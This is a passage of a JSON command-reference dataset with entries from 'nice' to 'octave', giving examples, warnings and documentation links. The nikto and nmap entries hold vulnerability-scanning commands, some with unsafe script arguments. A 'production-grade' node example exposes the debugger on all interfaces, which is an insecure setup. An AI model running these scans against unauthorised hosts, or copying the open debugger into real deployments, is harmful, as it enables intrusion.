        "url": "http://nginx.org/en/docs/windows.html"
      },
      {
        "platform": "generic",
        "url": "http://nginx.org/en/docs/beginners_guide.html"
      }
    ],
    "distroNotes": {
      "linux": "Available in all major package repositories",
      "macos": "Install via Homebrew: brew install nginx",
      "windows": "Download from nginx.org or use WSL"
    }
  },
  {
    "name": "nice",
    "subtitle": "Nice",
    "description": "Run commands with modified scheduling priority",
    "examples": [
      "nice -n 10 big_computation.sh  # Run script with lower priority (higher nice value)",
      "sudo nice -n -5 critical_task.sh  # Run task with higher priority (requires root for negative values)",
      "nice -n 19 backup.sh  # Run backup with lowest possible priority",
      "nice long_running_process  # Run process with default nice increment (+10)",
      "nice -n 19 ./data-processing.py & PROC_PID=$! && renice -5 $PROC_PID && ionice -c 1 -n 4 -p $PROC_PID && echo \"Critical process $PROC_PID: CPU priority elevated, I/O priority optimized for real-time data processing\" && while kill -0 $PROC_PID 2>/dev/null; do echo \"$(date): Processing $(ps -p $PROC_PID -o pcpu= | tr -d ' ')% CPU\"; sleep 30; done  # Dynamic process priority management with real-time monitoring for production workloads"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "caution",
    "syntaxPattern": "nice [options] command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Background processing",
        "commands": "nice -n 15 ./process_data.sh > output.log 2>&1 &",
        "explanation": "Run data processing in background with low priority",
        "title": "nice > output >& 1 &"
      }
    ],
    "relatedCommands": [
      {
        "name": "renice",
        "relationship": "combo",
        "reason": "renice changes priority of already running processes"
      },
      {
        "name": "ionice",
        "relationship": "similar",
        "reason": "ionice controls I/O scheduling priority"
      }
    ],
    "warnings": [
      "Nice values range from -20 (highest) to 19 (lowest priority)",
      "Only root can set negative (higher priority) values",
      "Doesn't guarantee execution order, just scheduling preference"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/nice.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/nice.html"
      },
      {
        "platform": "windows",
        "url": "Use Start-Process -Priority in PowerShell"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nikto",
    "subtitle": "Nikto",
    "description": "Web server vulnerability scanner for security assessment",
    "examples": [
      "nikto -h http://example.com  # Scan web server for common vulnerabilities",
      "nikto -h https://example.com -ssl  # Scan HTTPS site with SSL support",
      "nikto -h example.com -p 8080,8443  # Scan specific ports for web services",
      "nikto -h example.com -o nikto_report.txt  # Save scan results to text file",
      "nikto -h $TARGET -Plugins '+tests(report_csv)' -o nikto-$(date +%Y%m%d).csv && nikto -h $TARGET -ssl -Port 443,8443 -output nikto-ssl.xml -Format xml && python3 -c \"import csv, json; data=[dict(row) for row in csv.DictReader(open('nikto-$(date +%Y%m%d).csv'))]; print(json.dumps([item for item in data if 'OSVDB' in str(item)], indent=2))\" > critical-vulnerabilities.json  # Comprehensive security assessment with structured reporting and critical vulnerability extraction for security teams"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "nikto [options] -h <target>",
    "prerequisites": [
      "intermediate",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Comprehensive web security assessment",
        "commands": "nikto -h $TARGET -o nikto.txt && nmap --script http-enum $TARGET",
        "explanation": "Combine Nikto scan with nmap web enumeration",
        "title": "nikto && nmap"
      }
    ],
    "relatedCommands": [
      {
        "name": "owasp-zap",
        "relationship": "similar",
        "reason": "More comprehensive web application security testing"
      },
      {
        "name": "dirb",
        "relationship": "similar",
        "reason": "Web content scanner"
      }
    ],
    "warnings": [
      "Can be noisy and easily detected by security systems",
      "May generate false positives",
      "Requires authorization to scan target systems"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://cirt.net/Nikto2"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ninja",
    "subtitle": "Ninja",
    "description": "Fast, lightweight build system focused on speed",
    "examples": [
      "ninja  # Build all targets in build.ninja file",
      "ninja myapp  # Build only the myapp target",
      "ninja -t graph  # Generate graphviz file showing build dependencies",
      "ninja -t targets all  # Show all available build targets",
      "ninja -t clean  # Remove all built files",
      "ninja -v  # Show full command lines during build",
      "ninja -j $(nproc) -v 2>&1 | tee build.log && ninja -t graph | dot -Tsvg -o build-dependency-graph.svg && ninja -t compdb > compile_commands.json && echo \"High-performance build completed: $(grep -c 'FAILED\|ERROR' build.log || echo 0) errors, $(ninja -t targets all 2>/dev/null | wc -l) targets, dependency graph generated, IDE integration ready\"  # Maximum performance build with full logging, dependency visualization, and IDE compilation database generation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ninja [options] [targets]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "CMake with Ninja backend",
        "commands": "cmake -GNinja -B build && ninja -C build",
        "explanation": "Generate Ninja files with CMake then build with Ninja",
        "title": "cmake && ninja"
      }
    ],
    "relatedCommands": [
      {
        "name": "make",
        "relationship": "alternative",
        "reason": "Both are build systems, Ninja focuses on speed"
      },
      {
        "name": "cmake",
        "relationship": "combo",
        "reason": "CMake can generate Ninja build files"
      }
    ],
    "warnings": [
      "Designed to be generated by higher-level tools like CMake",
      "Extremely fast parallel builds",
      "Build files are not meant to be hand-written"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://ninja-build.org/manual.html"
      },
      {
        "platform": "macos",
        "url": "https://ninja-build.org/manual.html"
      },
      {
        "platform": "windows",
        "url": "https://ninja-build.org/manual.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nmap",
    "subtitle": "Network Mapper",
    "description": "Network discovery and security auditing for legitimate security assessments",
    "examples": [
      "nmap -sn 192.168.1.0/24  # Discover live hosts on network for asset inventory",
      "nmap -sS -sV -O --script safe target.com  # Comprehensive security scan with service detection and safe scripts",
      "nmap --script vuln target.com  # Run vulnerability detection scripts against target",
      "nmap --script ssl-cert,ssl-enum-ciphers -p 443 target.com  # Analyze SSL certificates and cipher suites",
      "nmap -sS -sV -O --script=default,vuln,discovery --script-args=unsafe=1 -T4 --min-rate=1000 $TARGET -oA security-audit-$(date +%Y%m%d) && nmap --script ssl-cert,ssl-enum-ciphers,ssl-heartbleed,ssl-poodle,ssl-ccs-injection -p 443,8443 $TARGET | tee ssl-security-report.txt && python3 -c \"import xml.etree.ElementTree as ET; tree=ET.parse('security-audit-$(date +%Y%m%d).xml'); [print(f'{host.get(\"addr\")}: {port.get(\"portid\")}/{port.get(\"protocol\")} - {port.find(\"state\").get(\"state\")}') for host in tree.findall('.//host') for port in host.findall('.//port')]\" > open-ports-summary.txt  # Enterprise security assessment with comprehensive vulnerability detection, SSL analysis, and structured reporting"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "nmap [scan-type] [options] <target>",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete security assessment",
        "commands": "nmap -sS -sV -O --script default,vuln target.com -oA security_scan",
        "explanation": "Comprehensive scan with multiple output formats",
        "title": "nmap"
      }
    ],
    "relatedCommands": [
      {
        "name": "masscan",
        "relationship": "alternative",
        "reason": "High-speed port scanner for large networks"
      },
      {
        "name": "zmap",
        "relationship": "alternative",
        "reason": "Internet-wide network scanner"
      }
    ],
    "warnings": [
      "Only scan networks you own or have explicit permission",
      "Some scans may trigger IDS/IPS systems",
      "Requires proper authorization for security testing"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://nmap.org/book/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nmcli",
    "subtitle": "NetworkManager CLI",
    "description": "Command-line tool for NetworkManager configuration",
    "examples": [
      "nmcli connection show  # Display all network connections",
      "nmcli device wifi connect SSID password PASSWORD  # Connect to WiFi network with password",
      "nmcli device status  # Display status of all network devices",
      "nmcli connection add type ethernet con-name static-eth ifname eth0 ip4 192.168.1.100/24 gw4 192.168.1.1  # Create ethernet connection with static IP",
      "nmcli connection modify static-eth ipv4.dns 8.8.8.8  # Set DNS server for connection",
      "nmcli connection up static-eth  # Activate the static ethernet connection"
    ],
    "platform": [
      "linux"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "nmcli [options] object command",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete network configuration",
        "commands": "nmcli connection add type ethernet con-name office ifname eth0 ip4 192.168.1.50/24 gw4 192.168.1.1 && nmcli connection modify office ipv4.dns 8.8.8.8,8.8.4.4 && nmcli connection up office",
        "explanation": "Create, configure, and activate office network connection",
        "title": "nmcli && nmcli && nmcli"
      }
    ],
    "relatedCommands": [
      {
        "name": "ip",
        "relationship": "alternative",
        "reason": "Lower-level network configuration"
      },
      {
        "name": "iwconfig",
        "relationship": "alternative",
        "reason": "Legacy wireless configuration tool"
      }
    ],
    "warnings": [
      "NetworkManager must be running",
      "May conflict with manual network configuration"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/nmcli.1.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nmon",
    "subtitle": "Nigel's Monitor",
    "description": "System performance monitor for AIX and Linux",
    "examples": [
      "nmon  # Start nmon with interactive dashboard",
      "nmon -f -s 30 -c 120  # Collect data every 30 seconds for 120 snapshots",
      "nmon -c 10 -s 5 -f -d  # Collect disk data every 5 seconds for 10 snapshots",
      "nmon -fT -s 60 -c 1440  # Generate 24-hour performance report with timestamps"
    ],
    "platform": [
      "linux"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "nmon [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Long-term monitoring with analysis",
        "commands": "nmon -fT -s 300 -c 288 && ls *.nmon",
        "explanation": "Collect 24 hours of data every 5 minutes, list output files",
        "title": "nmon && ls"
      }
    ],
    "relatedCommands": [
      {
        "name": "htop",
        "relationship": "alternative",
        "reason": "Both provide interactive system monitoring"
      },
      {
        "name": "sar",
        "relationship": "similar",
        "reason": "Both collect comprehensive system performance data"
      },
      {
        "name": "top",
        "relationship": "alternative",
        "reason": "Traditional process monitor vs nmon's comprehensive view"
      }
    ],
    "warnings": [
      "Interactive mode has specific key commands (c=CPU, d=disk, etc.)",
      "Data files (.nmon) need separate tools for analysis",
      "May not be available in standard repositories"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://nmon.sourceforge.net/pmwiki.php"
      },
      {
        "platform": "generic",
        "url": "https://www.ibm.com/docs/en/aix/7.1?topic=n-nmon-command"
      }
    ],
    "distroNotes": {
      "linux": "Install via package manager or download from IBM"
    }
  },
  {
    "name": "node",
    "subtitle": "Node.js",
    "description": "Node.js JavaScript runtime for server-side development",
    "examples": [
      "node app.js  # Execute JavaScript file with Node.js runtime",
      "node  # Launch Node.js interactive shell for testing code",
      "node -e \"console.log('Hello World')\"  # Run JavaScript code from command line",
      "node --version  # Display Node.js runtime version",
      "node --inspect app.js  # Start application with debugging port enabled",
      "node --max-old-space-size=4096 app.js  # Run with increased memory limit (4GB)",
      "node -r dotenv/config app.js  # Preload dotenv module to read .env file",
      "NODE_ENV=production node --max-old-space-size=4096 --inspect=0.0.0.0:9229 --trace-warnings --unhandled-rejections=strict --enable-source-maps app.js 2>&1 | tee logs/app-$(date +%Y%m%d-%H%M%S).log & echo $! > app.pid && sleep 5 && curl -f http://localhost:3000/health && echo \"Production Node.js service started: PID $(cat app.pid), health check passed, remote debugging enabled, comprehensive logging active\"  # Production-grade Node.js deployment with monitoring, debugging, error handling, and health verification"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "node [options] <file> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development server with monitoring",
        "commands": "npm install nodemon && npx nodemon app.js",
        "explanation": "Install and run with auto-restart on file changes",
        "title": "npm && npx"
      },
      {
        "scenario": "Production deployment",
        "commands": "NODE_ENV=production node --max-old-space-size=2048 app.js",
        "explanation": "Run in production mode with optimized memory settings",
        "title": "NODE_ENV"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "npm manages Node.js packages and dependencies"
      },
      {
        "name": "yarn",
        "relationship": "alternative",
        "reason": "Alternative package manager for Node.js"
      },
      {
        "name": "npx",
        "relationship": "combo",
        "reason": "npx executes Node.js packages directly"
      }
    ],
    "warnings": [
      "Different Node.js versions can have compatibility issues",
      "Memory leaks can occur with long-running processes",
      "Asynchronous nature requires proper error handling"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://nodejs.org/api/cli.html"
      },
      {
        "platform": "macos",
        "url": "https://nodejs.org/api/cli.html"
      },
      {
        "platform": "windows",
        "url": "https://nodejs.org/api/cli.html"
      },
      {
        "platform": "generic",
        "url": "https://nodejs.org/en/docs/guides/getting-started-guide/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "node-red",
    "subtitle": "Node-RED",
    "description": "Node-RED flow-based programming for IoT",
    "examples": [
      "node-red  # Starts Node-RED runtime and web editor",
      "node-red --port 1881  # Starts Node-RED web interface on port 1881",
      "node-red --safe  # Starts Node-RED without loading user flows for troubleshooting",
      "node-red-admin install node-red-contrib-modbus  # Installs Modbus nodes for industrial communication"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "safe",
    "syntaxPattern": "node-red [options]",
    "prerequisites": [
      "nodejs",
      "npm"
    ],
    "commandCombinations": [
      {
        "scenario": "Install and start with custom settings",
        "commands": "npm install -g node-red-contrib-dashboard && node-red --settings /path/to/settings.js",
        "explanation": "Installs dashboard nodes and starts Node-RED with custom settings",
        "title": "npm && node"
      },
      {
        "scenario": "Backup and restore flows",
        "commands": "node-red-admin backup flows.json && node-red-admin restore flows.json",
        "explanation": "Creates backup of flows and restores them",
        "title": "node && node"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "dependency",
        "reason": "Node.js package manager used to install Node-RED and additional nodes"
      },
      {
        "name": "mosquitto",
        "relationship": "complement",
        "reason": "MQTT broker commonly used with Node-RED for IoT messaging"
      },
      {
        "name": "home-assistant",
        "relationship": "complement",
        "reason": "Home automation platform that can integrate with Node-RED"
      }
    ],
    "warnings": [
      "Web editor runs on port 1880 by default",
      "Flows are stored in user directory and may need backup",
      "Some nodes require additional system dependencies",
      "Authentication should be enabled for production deployments"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://nodered.org/docs/getting-started/"
      },
      {
        "platform": "macos",
        "url": "https://nodered.org/docs/getting-started/"
      },
      {
        "platform": "windows",
        "url": "https://nodered.org/docs/getting-started/"
      },
      {
        "platform": "generic",
        "url": "https://nodered.org/docs/"
      }
    ],
    "distroNotes": {
      "windows": "Requires Node.js installation",
      "linux": "Available through npm or package managers",
      "macos": "Can be installed via npm or Homebrew"
    }
  },
  {
    "name": "nodetool",
    "subtitle": "Node Tool",
    "description": "Apache Cassandra cluster management and monitoring utility",
    "examples": [
      "nodetool status  # Display status of all nodes in cluster",
      "nodetool info  # Show detailed information about local node",
      "nodetool compact mykeyspace mytable  # Force compaction of specific table",
      "nodetool flush  # Flush all memtables to SSTables",
      "nodetool repair mykeyspace  # Run repair on specific keyspace",
      "nodetool snapshot -t backup-20231201 mykeyspace  # Create named snapshot of keyspace",
      "nodetool ring  # Show token ring and node ownership",
      "nodetool drain  # Prepare node for shutdown by flushing and stopping writes"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "nodetool [options] command [command-options]",
    "prerequisites": [
      "advanced"
    ],
    "commandCombinations": [
      {
        "scenario": "Maintenance workflow",
        "commands": "nodetool flush && nodetool compact && nodetool repair && nodetool cleanup",
        "explanation": "Complete maintenance routine: flush, compact, repair, cleanup",
        "title": "nodetool && nodetool && nodetool && nodetool"
      }
    ],
    "relatedCommands": [
      {
        "name": "cqlsh",
        "relationship": "combo",
        "reason": "CQL interface for Cassandra data operations"
      },
      {
        "name": "cassandra-stress",
        "relationship": "combo",
        "reason": "Performance testing tool for Cassandra"
      }
    ],
    "warnings": [
      "Some operations like repair can be very resource intensive",
      "Snapshots consume disk space until manually cleared",
      "Compaction may temporarily double disk usage"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://cassandra.apache.org/doc/latest/cassandra/tools/nodetool/nodetool.html"
      },
      {
        "platform": "macos",
        "url": "https://cassandra.apache.org/doc/latest/cassandra/tools/nodetool/nodetool.html"
      },
      {
        "platform": "windows",
        "url": "https://cassandra.apache.org/doc/latest/cassandra/tools/nodetool/nodetool.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nohup",
    "subtitle": "no hangup",
    "description": "Run commands immune to hangups, with output to non-tty",
    "examples": [
      "nohup ./long-running-script.sh &  # Run script that continues after terminal closes",
      "nohup python data-processor.py > processing.log 2>&1 &  # Redirect both stdout and stderr to custom log file",
      "nohup ./server --port 8080 &  # Start server that survives SSH session disconnect",
      "nohup make -j4 > build.log 2>&1 &  # Start compilation that continues even if you log out"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "nohup <command> [arguments] &",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Monitor nohup process",
        "commands": "nohup ./monitor.sh & echo $! > monitor.pid && tail -f nohup.out",
        "explanation": "Start background process, save PID, and monitor output",
        "title": "nohup & echo > monitor && tail"
      },
      {
        "scenario": "Start multiple background jobs",
        "commands": "for i in {1..3}; do nohup ./worker$i.sh > worker$i.log 2>&1 & done",
        "explanation": "Start multiple worker processes with separate log files",
        "title": "for ; do > worker >& 1 & done"
      }
    ],
    "relatedCommands": [
      {
        "name": "screen",
        "relationship": "alternative",
        "reason": "Terminal multiplexer that can detach/reattach sessions"
      },
      {
        "name": "tmux",
        "relationship": "alternative",
        "reason": "Modern terminal multiplexer with session management"
      },
      {
        "name": "disown",
        "relationship": "similar",
        "reason": "Shell builtin to detach jobs from current shell"
      }
    ],
    "warnings": [
      "Output goes to nohup.out by default if not redirected",
      "Process continues even after shell exits",
      "Need to track process ID to kill background job later"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/nohup.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/nohup.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/coreutils/manual/html_node/nohup-invocation.html"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL and Git Bash only"
    }
  },
  {
    "name": "npm",
    "subtitle": "Node Package Manager",
    "description": "Node Package Manager for JavaScript package management",
    "examples": [
      "npm init -y  # Create package.json with default values",
      "npm install express  # Install Express.js as production dependency",
      "npm install --save-dev eslint  # Install ESLint as development-only dependency",
      "npm install -g nodemon  # Install nodemon globally for all projects",
      "npm update  # Update all packages to latest compatible versions",
      "npm audit  # Check for known security vulnerabilities",
      "npm audit fix  # Automatically fix security vulnerabilities",
      "npm list --depth=0  # Show top-level installed packages",
      "npm run build  # Execute 'build' script defined in package.json",
      "npm publish  # Publish package to npm registry",
      "npm audit fix --force && npm run test && npm run build && npm run lint && npm version patch && npm publish --dry-run && npm publish --access public && npm pack && tar -tzf $(npm pack) | head -20 && npm view $(npm whoami)/$(node -p 'require(\"./package.json\").name') versions --json | jq '.[-5:]'  # Complete package publication pipeline with security fixes, testing, versioning, and publication verification with recent version history"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "npm <command> [args]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete project setup",
        "commands": "npm init -y && npm install express cors && npm install --save-dev nodemon eslint",
        "explanation": "Initialize project, install prod and dev dependencies",
        "title": "npm && npm && npm"
      },
      {
        "scenario": "Security maintenance",
        "commands": "npm audit && npm audit fix && npm update",
        "explanation": "Audit, fix vulnerabilities, and update packages",
        "title": "npm && npm && npm"
      }
    ],
    "relatedCommands": [
      {
        "name": "yarn",
        "relationship": "alternative",
        "reason": "Alternative package manager with similar functionality"
      },
      {
        "name": "pnpm",
        "relationship": "alternative",
        "reason": "Fast, disk space efficient package manager"
      },
      {
        "name": "node",
        "relationship": "combo",
        "reason": "npm manages packages for Node.js runtime"
      }
    ],
    "warnings": [
      "package-lock.json should be committed to version control",
      "Global packages may conflict between projects",
      "npm scripts run in different shell environments"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://docs.npmjs.com/"
      },
      {
        "platform": "macos",
        "url": "https://docs.npmjs.com/"
      },
      {
        "platform": "windows",
        "url": "https://docs.npmjs.com/"
      },
      {
        "platform": "generic",
        "url": "https://docs.npmjs.com/cli/v8/commands"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "npx",
    "subtitle": "Node Package Execute",
    "description": "Execute npm packages without installing globally",
    "examples": [
      "npx create-react-app my-app  # Create React app without global installation",
      "npx eslint src/  # Run locally installed ESLint",
      "npx webpack@4.0.0  # Execute specific version of webpack",
      "npx --yes cowsay 'Hello World'  # Auto-install and run cowsay package",
      "npx github:user/repo  # Execute package directly from GitHub",
      "npx --no-install eslint --version  # Run eslint only if already installed",
      "npx --yes @storybook/cli@latest sb init && npx chromatic --project-token=$CHROMATIC_TOKEN --exit-zero-on-changes && npx semantic-release --dry-run && npm run test:coverage && npx codecov && echo \"Enterprise frontend toolchain deployed: Storybook visual testing, Chromatic CI, semantic versioning, full test coverage, automated deployment ready\"  # Complete enterprise frontend development pipeline with visual testing, automated versioning, and coverage reporting"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "npx [options] <command>",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Quick project scaffolding",
        "commands": "npx create-next-app@latest my-app && cd my-app && npx next dev",
        "explanation": "Create Next.js app and start development server",
        "title": "npx && cd && npx"
      },
      {
        "scenario": "One-off package execution",
        "commands": "npx --yes json-server --watch db.json --port 3001",
        "explanation": "Install and run JSON server temporarily",
        "title": "npx"
      }
    ],
    "relatedCommands": [
      {
        "name": "npm",
        "relationship": "combo",
        "reason": "npx is part of npm package"
      },
      {
        "name": "yarn",
        "relationship": "alternative",
        "reason": "yarn dlx provides similar functionality"
      },
      {
        "name": "pnpm",
        "relationship": "alternative",
        "reason": "pnpm dlx provides similar functionality"
      }
    ],
    "warnings": [
      "Downloads and caches packages temporarily",
      "May have different behavior than globally installed version",
      "Can automatically install packages if not found"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.npmjs.com/package/npx"
      },
      {
        "platform": "macos",
        "url": "https://www.npmjs.com/package/npx"
      },
      {
        "platform": "windows",
        "url": "https://www.npmjs.com/package/npx"
      },
      {
        "platform": "generic",
        "url": "https://docs.npmjs.com/cli/v8/commands/npx"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "npx react-native",
    "subtitle": "Node Package Execute React Native",
    "description": "Run React Native commands without global installation",
    "examples": [
      "npx react-native@latest init MyApp  # Uses npx to run the latest version of React Native CLI to create a new project",
      "npx react-native upgrade  # Upgrades React Native version and updates project files accordingly",
      "npx react-native doctor  # Runs diagnostics to check if the development environment is properly configured"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "package-management",
    "safety": "safe",
    "syntaxPattern": "npx react-native [command] [options]",
    "prerequisites": [
      "node",
      "npm"
    ],
    "commandCombinations": [
      {
        "scenario": "Create and initialize new project with latest version",
        "commands": "npx react-native@latest init MyApp && cd MyApp && npx react-native start",
        "explanation": "Creates project with latest React Native, navigates into it, and starts development server",
        "title": "npx && cd && npx"
      }
    ],
    "relatedCommands": [
      {
        "name": "react-native",
        "relationship": "global",
        "reason": "Global installation alternative of React Native CLI"
      },
      {
        "name": "npm",
        "relationship": "dependency",
        "reason": "Package manager that provides npx functionality"
      }
    ],
    "warnings": [
      "May be slower than global installation for frequent use",
      "Requires internet connection for first-time package download",
      "Version conflicts may occur if global version is also installed"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://reactnative.dev/docs/environment-setup"
      },
      {
        "platform": "macos",
        "url": "https://reactnative.dev/docs/environment-setup"
      },
      {
        "platform": "windows",
        "url": "https://reactnative.dev/docs/environment-setup"
      },
      {
        "platform": "generic",
        "url": "https://reactnative.dev/docs/getting-started"
      }
    ],
    "distroNotes": {
      "windows": "Requires Node.js and npm installed"
    }
  },
  {
    "name": "nslookup",
    "subtitle": "Name Server Lookup",
    "description": "DNS lookup utility for querying domain name system",
    "examples": [
      "nslookup google.com  # Look up IP address for google.com",
      "nslookup 8.8.8.8  # Look up hostname for IP address",
      "nslookup google.com 8.8.8.8  # Query google.com using Google's DNS server",
      "nslookup -type=mx google.com  # Look up mail exchange records",
      "nslookup -type=ns google.com  # Look up name server records",
      "nslookup  # Start interactive nslookup session"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "networking",
    "safety": "safe",
    "syntaxPattern": "nslookup [options] [name] [server]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Domain information gathering",
        "commands": "nslookup -type=ns domain.com && nslookup -type=mx domain.com",
        "explanation": "Get nameserver and mail server information",
        "title": "nslookup && nslookup"
      }
    ],
    "relatedCommands": [
      {
        "name": "dig",
        "relationship": "alternative",
        "reason": "dig provides more detailed and flexible DNS queries"
      },
      {
        "name": "host",
        "relationship": "similar",
        "reason": "Another DNS lookup utility"
      }
    ],
    "warnings": [
      "Interactive mode can be confusing for beginners",
      "Output format less parseable than dig",
      "May not be available on some minimal installations"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/nslookup.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/nslookup.html"
      },
      {
        "platform": "windows",
        "url": "https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "nvm",
    "subtitle": "Node Version Manager",
    "description": "Node Version Manager for switching Node.js versions",
    "examples": [
      "nvm ls-remote  # Show all available Node.js versions for installation",
      "nvm install 18.17.0  # Install specific Node.js version",
      "nvm use 16.20.0  # Switch to Node.js version 16.20.0",
      "nvm alias default 18.17.0  # Set Node.js 18.17.0 as default version",
      "nvm ls  # Show all locally installed Node.js versions",
      "nvm install --lts  # Install latest Long Term Support version",
      "nvm use  # Use Node version specified in .nvmrc file",
      "nvm install --lts && nvm alias default lts/* && nvm use default && npm install -g yarn pnpm typescript eslint prettier nodemon pm2 && node --version && npm --version && echo \"$(node --version) $(npm --version) $(yarn --version) $(pnpm --version)\" > .tool-versions && echo \"Enterprise Node.js environment configured: LTS version $(node --version), essential tools installed, versions tracked for team consistency\"  # Complete enterprise Node.js environment setup with essential tools, version management, and team synchronization"
    ],
    "platform": [
      "linux",
      "macos"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "nvm <command> [version]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Project version management",
        "commands": "echo '16.20.0' > .nvmrc && nvm use && npm install",
        "explanation": "Set project Node version and install dependencies",
        "title": "echo > && nvm && npm"
      },
      {
        "scenario": "Switch between projects",
        "commands": "nvm use 14 && npm run test-legacy && nvm use 18 && npm run test-modern",
        "explanation": "Test with different Node versions",
        "title": "nvm && npm && nvm && npm"
      }
    ],
    "relatedCommands": [
      {
        "name": "node",
        "relationship": "combo",
        "reason": "nvm manages different versions of Node.js"
      },
      {
        "name": "fnm",
        "relationship": "alternative",
        "reason": "Fast Node Manager written in Rust"
      },
      {
        "name": "n",
        "relationship": "alternative",
        "reason": "Simple Node version management"
      }
    ],
    "warnings": [
      "Must source nvm script in shell configuration",
      "npm packages installed globally are version-specific",
      ".nvmrc file should contain only version number"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://github.com/nvm-sh/nvm"
      },
      {
        "platform": "macos",
        "url": "https://github.com/nvm-sh/nvm"
      },
      {
        "platform": "generic",
        "url": "https://github.com/nvm-sh/nvm#usage"
      }
    ],
    "distroNotes": {
      "windows": "Use nvm-windows or fnm for Windows"
    }
  },
  {
    "name": "octave",
    "subtitle": "GNU Octave",
    "description": "GNU Octave for numerical computations (MATLAB compatible)",
    "examples": [
      "octave  # Launch Octave interactive command line interface",
      "octave script.m  # Execute MATLAB/Octave script file",
      "octave --eval \"disp('Hello World')\"  # Run Octave code from command line",
      "octave --silent script.m  # Run script without startup messages",
      "octave --no-gui  # Start Octave without graphical interface",
      "octave --version  # Display version and configuration information",
      "octave --eval \"pkg install -forge signal control optimization statistics; A=randn(1000,1000); tic; [Q,R]=qr(A); [U,S,V]=svd(A); eigenvals=eig(A); toc; printf('Matrix operations completed: QR decomposition, SVD, eigenvalue computation on 1000x1000 matrix\\n'); save -binary scientific_results.mat Q R U S V eigenvals A\" && ls -lh scientific_results.mat && echo \"High-performance scientific computing completed: multiple decompositions, results archived for research collaboration\"  # Enterprise scientific computing pipeline with optimized linear algebra, performance timing, and collaborative data archival"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "octave [options] [file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Mathematical computation pipeline",
        "commands": "octave --eval \"A = rand(100); [U,S,V] = svd(A); disp(S(1:5,1:5))\"",
